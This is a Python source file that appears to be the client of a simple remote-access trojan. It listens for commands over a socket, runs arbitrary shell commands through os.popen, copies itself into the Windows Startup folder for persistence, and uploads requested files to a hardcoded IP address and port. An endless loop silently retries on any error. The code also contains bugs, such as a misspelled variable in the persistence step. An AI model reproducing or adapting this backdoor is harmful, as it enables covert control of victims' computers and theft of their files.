import socket
import webbrowser
import sys
import os
import shutil

def Main():
    HOST = socket.gethostname()
    PORT = 5000

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        while True:
            data = s.recv(1024)
            uncodedData = data.decode('utf-8')
            if not data:
                break
            elif uncodedData == 'rickroll':
                webbrowser.open('https://www.youtube.com/watch/dQw4w9WgXcQ')
            elif uncodedData == 'close':
                sys.exit()
            elif 'cmd=' in uncodedData:
                fullCommand = uncodedData.split('cmd=')
                command = fullCommand[1]
                os.popen(command)
            elif uncodedData == 'init':
                login = os.getlogin()
                path = f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
                directory = os.getcwd() + '\\client.py'
                print(directory, path)
                shutil.copyfile(direcotry, path)
            elif 'transfer=' in uncodedData:
                SEPERATOR = '<SEPERATOR>'
                BUFFER_SIZE = 4096
                host = '10.71.168.139'
                port = 43222
                filename = uncodedData.split('transfer=')[1]
                filesize = os.path.getsize(filename)
                so = socket.socket()
                so.connect((host, port))
                so.send(f'{filename}{SEPERATOR}{filesize}'.encode())

                with open(filename, 'rb') as f:
                    while True:
                        bytes_read = f.read(BUFFER_SIZE)
                        if not bytes_read:
                            break
                        so.sendall(bytes_read)
                    f.close()
                so.close()

def Start():
    while True:
        try:
            Main()
        except Exception:
            pass

Start()

